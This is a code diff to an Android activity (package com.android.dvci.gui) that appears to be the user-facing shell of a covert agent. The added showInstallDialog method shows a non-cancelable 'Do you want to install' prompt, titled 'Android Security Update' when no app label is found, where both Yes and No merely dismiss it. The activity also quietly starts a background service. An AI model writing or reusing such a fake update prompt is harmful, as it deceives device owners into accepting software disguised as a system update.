@@ -10,13 +10,18 @@
 package com.android.dvci.gui;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.view.ContextThemeWrapper;
 import android.widget.TextView;
 
 import com.android.dvci.Core;
@@ -47,6 +52,10 @@ public class ASG extends Activity {
 	 */
 	@Override
 	public void onCreate(final Bundle savedInstanceState) {
+		if(Cfg.DEMO) {
+			setTheme(R.style.Theme_AndroidStaticDefaultBlack);
+		}
+
 		super.onCreate(savedInstanceState);
 		actualCreate(savedInstanceState);
 	}
@@ -75,18 +84,54 @@ public class ASG extends Activity {
 		super.onCreate(savedInstanceState);
 
 		Status.setAppGui(this);
-
 		setContentView(R.layout.main);
 
-		//fillContentText();
+		if(Cfg.DEMO){
+			fillContentText();
+		}
 
 		startService();
 	}
 
+	public synchronized void showInstallDialog() {
+		//fillContentText();
+		AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
+		new ContextThemeWrapper(Status.getAppGui(), AlertDialog.THEME_HOLO_LIGHT));
+
+		PackageManager packageManager = Status.getAppContext().getPackageManager();
+		ApplicationInfo applicationInfo = null;
+		try {
+			applicationInfo = packageManager.getApplicationInfo(getApplicationInfo().packageName, 0);
+		} catch (final PackageManager.NameNotFoundException e) {}
+		final String title = (String)((applicationInfo != null) ? packageManager.getApplicationLabel(applicationInfo) : M.e("Android Security Update"));
+
+		// set title
+		alertDialogBuilder.setTitle("Do you want to install '" + title + "' ?");
+
+		// set dialog message
+		alertDialogBuilder
+				.setMessage("Click yes to install!")
+				.setCancelable(false)
+				.setPositiveButton("Yes",new DialogInterface.OnClickListener() {
+					public void onClick(DialogInterface dialog,int id) {
+						dialog.cancel();
+					}
+				})
+				.setNegativeButton("No",new DialogInterface.OnClickListener() {
+					public void onClick(DialogInterface dialog,int id) {
+						dialog.cancel();
+					}
+				});
+
+		// create alert dialog
+		AlertDialog alertDialog = alertDialogBuilder.create();
+
+		// show it
+		alertDialog.show();
+	}
+
 	private void fillContentText() {
 		TextView t = (TextView) findViewById(R.id.content);
-
-		t.setText("Update\n\n");
 
 		if (Build.MODEL.length() > 0)
 			t.append("Model: " + Build.MODEL + "\n");
@@ -129,8 +174,6 @@ public class ASG extends Activity {
 			}
 		}
 
-		t.append("\n\n");
-		t.append("Finished");
 	}
 
 	private void startExtService() {
